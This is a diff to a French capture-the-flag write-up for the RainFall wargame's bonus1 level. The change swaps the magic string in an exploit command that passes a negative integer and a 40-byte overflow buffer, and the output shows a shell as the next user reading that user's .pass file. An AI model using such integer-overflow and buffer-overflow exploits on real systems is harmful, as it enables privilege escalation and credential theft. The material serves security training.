@@ -14,7 +14,7 @@ Le but sera donc d'avoir un nombre négatif qui fois 4 devient 44 pour permettre
 #### Etape 4 : Execution 
 
 ```bash
-bonus1@RainFall:~$ ./bonus1 -1073741812 $(python -c 'print "a"*40 +"WOLF"')
+bonus1@RainFall:~$ ./bonus1 -1073741812 $(python -c 'print "a"*40 +"FLOW"')
 $ whoami
 bonus2
 $ cat /home/user/bonus2/.pass
